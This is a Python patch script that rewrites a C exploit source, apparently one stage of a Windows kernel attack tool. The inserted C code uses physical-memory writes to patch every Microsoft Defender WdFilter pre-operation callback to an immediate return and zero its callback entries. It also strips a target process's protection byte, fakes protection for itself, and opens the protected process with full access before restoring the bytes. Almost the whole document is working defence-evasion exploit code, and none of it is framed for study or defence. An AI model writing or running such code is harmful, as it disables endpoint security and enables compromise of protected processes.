#!/usr/bin/env python3
import re

with open('step6_final.c', 'r', encoding='utf-8') as f:
    content = f.read()

OLD = r'''    printf("[7b] Finding WdFilter PreOp function in RAM for code patch...\n");
    uint64_t preop_va = (n_cbs > 0) ? cb_preop_arr[0] : 0;
    if (!preop_va) {
        printf("    [!] No callback found — cannot code-patch. Abort.\n");
        CloseHandle(g_dev); return 1;
    }

    uint8_t orig_preop_byte = 0;
    uint64_t preop_code_pa = find_wdfilter_preop_pa(preop_va, wdf_base, wdf_size, &orig_preop_byte);

    HANDLE hProc = NULL;
    uint8_t zero1 = 0, fake_prot = 0x31;

    if (preop_code_pa) {
        printf("    PreOp code PA = 0x%016llX  orig_byte=0x%02X\\n\\n",
               (unsigned long long)preop_code_pa, orig_preop_byte);

        /* Patch: RET (0xC3) at first byte of PreOp function */
        uint8_t ret_insn = 0xC3;
        if (phys_write_verified(preop_code_pa, &ret_insn, 1)) {
            printf("    [+] PreOp patched to RET. Attempting OpenProcess...\\n");

            /* Also clear Protection */
            phys_write(tgt_ep.pa+OFF_PROT, &zero1, 1);
            if (self_ep.pa) phys_write(self_ep.pa+OFF_PROT, &fake_prot, 1);

            hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);

            /* Restore self immediately */
            if (self_ep.pa) phys_write(self_ep.pa+OFF_PROT, &self_ep.prot, 1);

            /* Restore original byte BEFORE checking result */
            phys_write(preop_code_pa, &orig_preop_byte, 1);

            if (hProc)
                printf("    [+] SUCCESS!\\n\\n");
            else
                printf("    [-] Still blocked (err=%lu)\\n\\n", GetLastError());
        } else {
            printf("    [-] Code patch write FAILED — code page not writable via MmMapIoSpace\\n\\n");
        }
    } else {
        printf("    [!] PreOp function not found in RAM\\n\\n");
    }'''

NEW = '''    /* 7b: Patch ALL WdFilter PreOp functions + cache_evict before OpenProcess */
    printf("[7b] Patching ALL WdFilter PreOp functions...\\n");
    if (n_cbs == 0) { printf("    [!] No callbacks.\\n"); CloseHandle(g_dev); return 1; }

    uint64_t wdf_pa = find_wdfilter_image_pa(wdf_size);

    HANDLE hProc = NULL;
    uint8_t zero1 = 0, fake_prot = 0x31;

    uint64_t preop_pa_arr[MAX_CBS] = {0};
    uint8_t  preop_ob_arr[MAX_CBS] = {0};
    int n_code_patched = 0;

    if (wdf_pa) {
        for (int ci = 0; ci < n_cbs; ci++) {
            uint64_t rva = cb_preop_arr[ci] - wdf_base;
            uint64_t ppa = wdf_pa + rva;
            uint8_t  ob  = 0;
            printf("    [%d] rva=0x%llX pa=0x%016llX ",
                   ci,(unsigned long long)rva,(unsigned long long)ppa);
            if (pa_in_range(ppa,1) && phys_read(ppa,&ob,1)) {
                preop_pa_arr[ci]=ppa; preop_ob_arr[ci]=ob;
                printf("orig=0x%02X OK\\n",ob); n_code_patched++;
            } else { printf("FAIL\\n"); }
        }
    }

    if (n_code_patched > 0) {
        uint8_t ret_insn=0xC3, zero8[8]={0};
        printf("\\n    Patching %d preop(s) + zeroing entries...\\n",n_code_patched);
        for (int ci=0;ci<n_cbs;ci++){
            if (preop_pa_arr[ci]) phys_write_verified(preop_pa_arr[ci],&ret_insn,1);
            phys_write(cb_pa_arr[ci]+0x28,zero8,8);
            phys_write(cb_pa_arr[ci]+0x30,zero8,8);
        }
        phys_write(tgt_ep.pa+OFF_PROT,&zero1,1);
        if (self_ep.pa) phys_write(self_ep.pa+OFF_PROT,&fake_prot,1);
        printf("    Cache eviction (256MB, I-cache flush)... "); fflush(stdout);
        cache_evict();
        printf("done\\n");
        hProc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,target_pid);
        if (self_ep.pa) phys_write(self_ep.pa+OFF_PROT,&self_ep.prot,1);
        for (int ci=0;ci<n_cbs;ci++){
            if (preop_pa_arr[ci]) phys_write(preop_pa_arr[ci],&preop_ob_arr[ci],1);
            if (cb_preop_arr[ci]) phys_write(cb_pa_arr[ci]+0x28,&cb_preop_arr[ci],8);
        }
        if (hProc) printf("    [+] SUCCESS!\\n\\n");
        else printf("    [-] Still blocked (err=%lu)\\n\\n",GetLastError());
    } else { printf("    [!] No preop PAs found\\n\\n"); }'''

if OLD in content:
    content = content.replace(OLD, NEW, 1)
    with open('step6_final.c', 'w', encoding='utf-8') as f:
        f.write(content)
    print("PATCHED OK")
else:
    print("STRING NOT FOUND")
    # Try to find approximate location
    idx = content.find('[7b] Finding WdFilter PreOp function')
    print(f"Found '[7b]' at index: {idx}")
